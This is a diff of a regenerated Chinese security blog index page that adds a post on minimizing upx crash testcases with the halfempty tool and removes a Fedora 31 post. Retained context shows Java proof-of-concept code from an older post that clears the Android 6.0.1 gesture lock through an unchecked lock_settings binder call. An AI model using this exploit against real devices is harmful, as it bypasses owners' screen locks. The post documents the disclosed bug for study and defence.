@@ -128,7 +128,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -190,6 +190,89 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/05/21/halfempty/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/05/21/halfempty/" class="post-title-link" itemprop="url">halfempty 的一些使用说明</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-05-21 10:00:34" itemprop="dateCreated datePublished" datetime="2020-05-21T10:00:34+08:00">2020-05-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><a target="_blank" rel="noopener" href="https://github.com/googleprojectzero/halfempty">https://github.com/googleprojectzero/halfempty</a></p>
+<p>google P0 <a target="_blank" rel="noopener" href="https://twitter.com/taviso">@taviso</a> 提供的 testcase 并行快速精简工具 （A fast, parallel test case minimization tool）<br>需要注意的是 halfempty 只能精简导致目标程序 crash 的 testcase，如果 testcase 不导致目标程序 crash， 还是需要使用 afl-tmin 类似的工具根据 coverage 来精简。</p>
+<p>halfempty 工具向测试脚本传递内容时使用的是 pipe， 如果测试的程序只接受文件路径作为参数时，需要一些技巧，README 虽然有提及但是说的比较晦涩。</p>
+<p>以 upx 为例，upx 的命令行帮助如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@fuzzing-5:/mnt/disk/halfempty# ./upx.out_x86-64</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">Usage: upx.out_x86-64 [-123456789dlthVL] [-qvfk] [-o file] file..</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  -1     compress faster                   -9    compress better</span><br><span class="line">  -d     decompress                        -l    list compressed file</span><br><span class="line">  -t     test compressed file              -V    display version number</span><br><span class="line">  -h     give more help                    -L    display software license</span><br><span class="line">Options:</span><br><span class="line">  -q     be quiet                          -v    be verbose</span><br><span class="line">  -oFILE write output to &#x27;FILE&#x27;</span><br><span class="line">  -f     force compression of suspicious files</span><br><span class="line">  -k     keep backup files</span><br><span class="line">file..   executables to (de)compress</span><br><span class="line"></span><br><span class="line">Type &#x27;upx.out_x86-64 --help&#x27; for more detailed help.</span><br><span class="line"></span><br><span class="line">UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.io</span><br></pre></td></tr></table></figure>
+
+<p>upx 只能使用文件路径作为参数， 比如像这样执行命令。 <code>./upx.out_x86-64 crash.upx</code></p>
+<p>按照 README 中的例子编写测试脚本 test.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./upx.out_x86-64 <span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $? -eq 139; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p>执行的时候会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">./halfempty ./test.sh  crash.upx</span><br><span class="line">╭│   │ ── halfempty ───────────────────────────────────────────────── v0.30 ──</span><br><span class="line">╰│ 16│ A fast, parallel testcase minimization tool</span><br><span class="line"> ╰───╯ ───────────────────────────────────────────────────────── by @taviso ──</span><br><span class="line"></span><br><span class="line">Input file &quot;crash.upx&quot; is now 19088 bytes, starting strategy &quot;bisect&quot;...</span><br><span class="line">Verifying the original input executes successfully... (skip with --noverify)</span><br><span class="line">** Message: This program expected `./test1.sh` to return successfully</span><br><span class="line">** Message: for the original input (i.e. exitcode zero).</span><br><span class="line">** Message: Try it yourself to verify it&#x27;s working.</span><br><span class="line">** Message: Use a command like: `cat crash.upx | ./test.sh || echo failed`</span><br><span class="line"></span><br><span class="line">** (halfempty:2477): WARNING **: Strategy &quot;bisect&quot; failed, cannot continue.</span><br></pre></td></tr></table></figure>
+
+<p>正确的方法是使用临时文件，因为 halfempty 是一个并行的工具，每次使用的临时文件都应该不一样。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">tempfile=`mktemp` &amp;&amp; cat &gt; <span class="variable">$&#123;tempfile&#125;</span></span><br><span class="line"></span><br><span class="line">./upx.out_x86-64 <span class="variable">$&#123;tempfile&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $? -eq 139; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p>运行后的输出，大致如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@fuzzing-5:/mnt/disk/halfempty# ./halfempty  ./test.sh  crash.upx </span><br><span class="line">╭│   │ ── halfempty ───────────────────────────────────────────────── v0.30 ──</span><br><span class="line">╰│ 16│ A fast, parallel testcase minimization tool</span><br><span class="line"> ╰───╯ ───────────────────────────────────────────────────────── by @taviso ──</span><br><span class="line"></span><br><span class="line">Input file &quot;crash.upx&quot; is now 19088 bytes, starting strategy &quot;bisect&quot;...</span><br><span class="line">Verifying the original input executes successfully... (skip with --noverify)</span><br><span class="line">The original input file succeeded after 0.0 seconds.</span><br><span class="line">New finalized size: 19088 (depth=2) real=0.0s, user=0.0s, speedup=~-0.0s</span><br><span class="line">treesize=6654, height=6376, unproc=0, real=4.4^C user=19.3s, speedup=~14.9s</span><br></pre></td></tr></table></figure>
+
+<p>已经可以正常运行了。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -962,7 +1045,7 @@
 
 <h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	IBinder serviceBinder = getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Parcel data1 = Parcel.obtain();</span><br><span class="line">	Parcel reply1 = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> IBinder <span class="title">getIBinder</span><span class="params">(String service)</span> </span>&#123;</span><br><span class="line">	IBinder serviceBinder = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="keyword">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
-<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#97;&#103;&#x67;&#105;&#101;&#x73;&#64;&#103;&#111;&#x6f;&#103;&#108;&#x65;&#46;&#x63;&#x6f;&#109;">&#x6a;&#97;&#103;&#x67;&#105;&#101;&#x73;&#64;&#103;&#111;&#x6f;&#103;&#108;&#x65;&#46;&#x63;&#x6f;&#109;</a>    Wed Apr 13 16:35:36 2016 -0700</p>
+<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#x61;&#103;&#103;&#x69;&#101;&#x73;&#x40;&#103;&#x6f;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#111;&#x6d;">&#x6a;&#x61;&#103;&#103;&#x69;&#101;&#x73;&#x40;&#103;&#x6f;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#111;&#x6d;</a>    Wed Apr 13 16:35:36 2016 -0700</p>
 <p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
 <p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
@@ -1048,73 +1131,6 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx">https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx</a></p>
 <p>这个插件将使用 aria2c 下载，使用得先准备一个可以使用的aria2c<br>要让 aria2c 更好用一些，可以修改一下配置，配置文件可以参考</p>
 <p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf">https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/Fedora31/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="henices">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/Fedora31/" class="post-title-link" itemprop="url">Fedora31 的几个变化</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="1-默认启用-Cgroups-V2"><a href="#1-默认启用-Cgroups-V2" class="headerlink" title="1. 默认启用 Cgroups V2"></a>1. 默认启用 Cgroups V2</h2><p>nozuonodie， 升级到 Fedora 31 后， CgroupsV2 已经默认开启，理由是原来不是默认开启没人用，现在让 Fedora 用户先当当小白鼠，<br>于是 Docker 就倒下了。<a target="_blank" rel="noopener" href="http://t.cn/Ai1sI5LH">http://t.cn/Ai1sI5LH</a>   grub2 配置文件 /etc/default/grub， 内核参数添加 systemd.unified_cgroup_hierarchy=0<br>可以重新开启  CgroupsV1 ​​​​</p>
-<h2 id="2-默认的-Python-为-Python3"><a href="#2-默认的-Python-为-Python3" class="headerlink" title="2. 默认的 Python 为 Python3"></a>2. 默认的 Python 为 Python3</h2><p><a target="_blank" rel="noopener" href="https://fedoraproject.org/wiki/Changes/Python_means_Python3">https://fedoraproject.org/wiki/Changes/Python_means_Python3</a></p>
-<p>唉，不得不说 Fedora 这次有点太激进了， 搞得我编译 chromium 又出问题了。 要换回去有个歪招</p>
-<p><code>ln -s /usr/bin/python2 /usr/local/bin/python</code></p>
 
       
     </div>
